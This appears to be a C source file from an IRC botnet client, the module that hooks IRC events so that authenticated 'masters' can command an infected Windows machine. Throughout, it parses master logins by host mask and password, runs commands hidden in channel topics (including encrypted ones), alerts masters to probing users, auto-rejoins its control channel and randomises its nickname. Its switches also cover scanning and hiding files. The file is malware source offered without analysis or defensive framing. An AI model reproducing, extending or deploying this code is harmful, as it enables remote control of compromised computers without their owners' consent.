#include "includes.h"
#include "functions.h"

extern char str_auth_good[];
extern char str_auth_full[];
extern char str_auth_bad[];
extern char str_spy_privmsg[];
extern char str_kick_msg[];


SWITCHES GetSwitches(char *a[MAX_TOKENS],int t)
{
	SWITCHES rswitch;

	unsigned char switches[256];
	ZeroMemory(switches,sizeof(switches));
	for (int i=t; i>=0; i--) {
		if (a[i])
		{ 
			if ((a[i][0] == '-') && (a[i][2] == 0))
			{	// -a
				switches[a[i][1]]=1;
				a[i][0]=0;
				a[i][1]=0;
				a[i][2]=0;
				a[i]=NULL;
			}
			else if ((a[i][0] == '-') && (a[i][2] == ':') && (a[i][4] == 0))
			{	// -r:*
				switches[a[i][1]]=1;
				if (a[i][1] == 'r')
					rswitch.replace_char=a[i][3];
				a[i][0]=0;
				a[i][1]=0;
				a[i][2]=0;
				a[i]=NULL;
			}
			else
				break;
		}
	}

	rswitch.silent	= (switches['s']);
	rswitch.halfsilent = (switches['h']);
	rswitch.verbose = (switches['v']);
	rswitch.stop	= (switches['S']);
	rswitch.force	= (switches['f']);

	rswitch.createwait = (switches['W']);
	rswitch.replace_underscores = (switches['r']);
	rswitch.overwrite			= (switches['O']);
	rswitch.attrib_hidden		= (switches['H']);
	rswitch.attrib_normal		= (switches['N']);
	rswitch.attrib_readonly		= (switches['R']);
	rswitch.attrib_system		= (switches['S']);//this is also stop, but the file control
												 //doesnt use a thread so it should still be fine
	rswitch.scan_a = (switches['a']);
	rswitch.scan_b = (switches['b']);
	rswitch.scan_c = (switches['c']);
	rswitch.scan_r = (switches['r']);
	rswitch.scan_e = (switches['e']);

	rswitch.netstat_noresolve = (switches['N']);
	rswitch.netstat_all = (switches['a']);
	
	rswitch.speedtest_reset = (switches['R']);
	
	return rswitch;
}



int private_msg(char* params, irc_reply_data* hostd, void* conn)
{
	IRC* irc=(IRC*)conn;

	char *a[MAX_TOKENS];
	params++; //remove the ':'
	char fcmd[1024];
	strcpy(fcmd,params);
	int t=SplitParams(a,params,MAX_TOKENS);
	if (fcmd[0] == prefix)
	{
		SWITCHES switches=GetSwitches(a,t);

		for (int u=0;u<MAX_TOKENS;u++)
		{
			if (a[u])
			{
			//	printf("a[%i]: %s\n",u,a[u]);

			}
		}

		if (!a[0])
			return 1;

		if (a[0][0] == prefix)
		{
			a[0]++;

			if (irc->is_logged_in(hostd->nick,hostd->ident,hostd->host))
			{
				if (!strcmp(hostd->target,irc->current_nick()))	// If its a private msg the target
					hostd->target=hostd->nick;					// should turn into the person sending the message

				IRC_CommandParse(a,t,fcmd,hostd,irc,switches);
//				irc->privmsg(hostd->target,"Parse command here. (%s, %s)",a[0],a[1]);
			}
			else
			{
				if (!strcmp(hostd->target,irc->current_nick()))
				{
#ifndef NO_SPY_WARNING
					if (irc->has_master())
						irc->notice_masters(str_spy_privmsg,warn_title,hostd->nick,hostd->ident,hostd->host,fcmd);
					else
						irc->privmsg(servers[curserver].warningchan,str_spy_privmsg,warn_title,hostd->nick,hostd->ident,hostd->host,fcmd);

					//addlog(SECLOG,sendbuf);
					return 1;
#endif
					hostd->target=hostd->nick;
				}

				if (!strcmp(a[0],cmd_login_1) || !strcmp(a[0],cmd_login_2))
				{
					if (a[1]==NULL)
						return 1;

					
					char h[256];
					_snprintf(h,sizeof(h),"%s!%s@%s",hostd->nick,hostd->ident,hostd->host);
					BOOL host_ok=FALSE;
					for (int i=0; i < authsize; i++) {
#ifndef NO_WILDCARD
						if (wildcardfit(authost[i], h)) { 
							host_ok = TRUE;
							break;
						}
#else
						if (strcmp(h, authost[i]) == 0) {
							host_ok = TRUE;
							break;
						}
#endif
					}

					if (!host_ok || strcmp(password, a[1]) != 0) {
						if (irc->has_master())
							irc->notice_masters(str_auth_bad,warn_title,hostd->nick,hostd->ident,hostd->host,a[1]);
						else
							irc->privmsg(servers[curserver].warningchan,str_auth_bad,warn_title,hostd->nick,hostd->ident,hostd->host,a[1]);

	//					addlogv(SECLOG,"%s *Failed authentication by: (%s!%s@%s), password: %s.",main_title,hostd->nick,hostd->ident,hostd->host,a[1]);
						return 1;
					}

					if (irc->add_login(hostd->nick,hostd->ident,hostd->host) == -1)
					{
						if (!switches.silent)
							irc->privmsg(hostd->target,str_auth_full,main_title);
					}
					else
					{
						if (!switches.silent)
							irc->privmsg(hostd->target,str_auth_good,main_title);
					}

	//				addlogv(MAINLOG,"%s User: %s logged in.", main_title, hostd->nick);
					return 1;
				}
	//			addlogv(SECLOG,"Attempted command by user: %s!%s@%s in channel: %s. Command: %s",hostd->nick,hostd->ident,hostd->host,hostd->target,params);
			}
		} 
	}//if fcmd==prefix
	else
	{
		if (lstrcmpi(hostd->target,irc->current_nick()))
			return 1;

		if (!lstrcmpi("\1VERSION\1",a[0]))
		{
#ifndef NO_VERSION_REPLY
			irc->notice(hostd->nick,"\1VERSION %s\1",versionlist[curversion]);
#endif//NO_VERSION_REPLY
			if (!irc->is_logged_in(hostd->nick,hostd->ident,hostd->host))
			{
#ifndef NO_SPY_WARNING
				if (irc->has_master())
					irc->notice_masters("%s Version request from: %s!%s@%s",warn_title,hostd->nick,hostd->ident,hostd->host);
				else
					irc->privmsg(servers[curserver].warningchan,"%s Version request from: %s!%s@%s",warn_title,hostd->nick,hostd->ident,hostd->host);
#endif//NO_SPY_WARNING
			}
			return 1;
		}
		
		if (!lstrcmpi("\1PING",a[0]) && a[1])
		{
#ifndef NO_PING_REPLY
			irc->notice(hostd->nick,"\1PING %s",a[1]);
#endif//NO_PING_REPLY
			if (!irc->is_logged_in(hostd->nick,hostd->ident,hostd->host))
			{
#ifndef NO_SPY_WARNING
				if (irc->has_master())
					irc->notice_masters("%s Ping request from: %s!%s@%s",warn_title,hostd->nick,hostd->ident,hostd->host);
				else
					irc->privmsg(servers[curserver].warningchan,"%s Ping request from: %s!%s@%s",warn_title,hostd->nick,hostd->ident,hostd->host);
#endif//NO_SPY_WARNING
			}
			return 1;
		}

	}

	return 0;
}

int got_kicked(char* params, irc_reply_data* hostd, void* conn)
{
	IRC* irc=(IRC*)conn;
	if (strstr(params,irc->current_nick()))
	{
		char *a[2];
		SplitParams(a,params,2);
		if (a[0] && a[1])
		{
			//a[0]=channel
			//a[1]=nick getting kicked
			if (!strcmp(a[0],servers[curserver].chan))
				irc->join(servers[curserver].chan, servers[curserver].chanpass);
			else
				irc->join(a[0]); // hopefully there is no key set

			irc->privmsg(a[0],str_kick_msg,hostd->nick);
		}
	}
	return 0;
}
//extern char *key;
int parse_topic(char* params, irc_reply_data* hostd, void* conn)
{
	IRC* irc=(IRC*)conn;
	//irc->privmsg("#opers","Should parse topic here... (%s)",params);

	char tstr[IRCLINE];
	char chan[16];
	strncpy(tstr,params,sizeof(tstr));
	char *a[3];
	SplitParams(a,tstr,3);
	if (a[0] && a[1])
	{
		if (!strcmp(a[0],irc->current_nick()))
			strncpy(chan,a[1],sizeof(chan));
		else
			strncpy(chan,a[0],sizeof(chan));

		char *cmd;
		cmd=strchr(params,':');	
		cmd++;
#ifdef _DEBUG
		printf("Topic: \"%s\" by: %s\n",cmd,a[0]);
#endif
		if (cmd[0]=='$')
		{
			if (strstr(cmd,"$dec(") && strstr(cmd,")"))
			{
				if (strlen(cmd)>6)
				{
					char *str=substr(cmd,5,strlen(cmd)-2);
					if (str)
					{
						Encrypt2(str);
#ifdef _DEBUG
						irc->privmsg(chan,"%s %s is now %s",main_title,cmd,str);
#endif
						cmd=str;
					}
				}
			}
		}

		char *cmds[MAX_TOKENS];
		cmds[0]=strtok(cmd,"|");
		int i;
		for (i=1;i<MAX_TOKENS;i++)
		{
			cmds[i]=strtok(NULL,"|");
			if (cmds[i])
				continue;
			else
				break;
		}

		irc_reply_data thostd;
		thostd.target=chan;
		thostd.nick="topic";
		thostd.ident="topic";
		thostd.host="topic";

		char tstr[512];
		for (int t=0;t<i;t++)
		{
			if (cmds[t])
			{
				sprintf(tstr,"%s",cmds[t]);
				if (tstr[0]==prefix)
				{
					Sleep(FLOOD_DELAY/2);
					IRC_TempCommand(tstr,&thostd,conn,TRUE,TRUE);
				}
			}
		}
	}

	return 0;
}

int end_of_motd(char* params, irc_reply_data* hostd, void* conn)
{
	IRC* irc=(IRC*)conn;
	
	DWORD id;
	CreateThread(NULL, 0, &GetExIP, NULL, 0, &id);
	NTHREAD pt;
	pt.conn=conn;
	pt.gotinfo=FALSE;
	CreateThread(NULL, 0, &PingTimeoutThread, &pt, 0, &id);
	while (!pt.gotinfo)
		Sleep(50);
	
	irc->mode(servers[curserver].modeonconn);
	irc->join(servers[curserver].chan, servers[curserver].chanpass);

	return 0;
}

int motd_ip(char* params, irc_reply_data* hostd, void* conn)
{
	IRC* irc=(IRC*)conn;
	char *b,*a[MAX_PARAMS];
	int tparams=0,at=0;
	DWORD id;

	b=strtok(params," ");

	while(b != NULL){
		b = strtok(NULL," ");
		a[tparams]=b;
		tparams++;
	}

	for(int i=0;i<tparams-1;i++){
		at=(int)strchr(a[i],'@');
		if(at>0){
//			ParseIP(a[i]);
			ip1parse=a[i];
			CreateThread(NULL, 0, &GetExIP, NULL, 0, &id);
		}
	}
	return 0;
}

int joined_chan(char* params, irc_reply_data* hostd, void* conn)
{
	IRC* irc=(IRC*)conn;
	char *a[1];
	SplitParams(a,params,2);
	if (a[0] && a[1])
	{
		//a[0]=nick
		//a[1]=channel
		if (strcmp(servers[curserver].modeonjoin,""))
			irc->mode(a[1], servers[curserver].modeonjoin, 0);
	}
	return 0;
}

int nick_in_use(char* params, irc_reply_data* hostd, void* conn)
{
	IRC* irc=(IRC*)conn;
	irc->nick(irc->nickgen(NICK_TYPE,REQ_NICKLEN));
	return 0;
}

//int mode_change(char* params, irc_reply_data* hostd, void* conn)
//{	
//	IRC* irc=(IRC*)conn;
//	char *a[2];
//	SplitParams(a,params,3);
//	if (a[0] && a[1] && a[2])
//	{
//		//a[0]=channel
//		//a[1]=mode
//		//a[2]=nick getting voiced
//
//		if (strstr(a[1],"+o") && strstr(a[2],irc->current_nick()))
//		{
//			irc->mode(a[0], servers[curserver].modeonjoin, 0);
//		}
//	}
//	return 0;
//}

int server_err(char* params, irc_reply_data* hostd, void* conn)
{	
	return 0;
}


void HookProtocol(void *conn)
{
	IRC* irc=(IRC*)conn;
//	irc->hook_irc_command("MODE",	&mode_change);
	irc->hook_irc_command("ERROR",	&server_err);
	irc->hook_irc_command("PRIVMSG",&private_msg);
	irc->hook_irc_command("KICK",	&got_kicked);
	irc->hook_irc_command("TOPIC",	&parse_topic);
	irc->hook_irc_command("001",	&motd_ip);
	irc->hook_irc_command("332",	&parse_topic);
	irc->hook_irc_command("366",	&joined_chan);
	irc->hook_irc_command("005",	&end_of_motd);//not really end of motd
	irc->hook_irc_command("376",	&end_of_motd);
	irc->hook_irc_command("422",	&end_of_motd);
	irc->hook_irc_command("433",	&nick_in_use);
}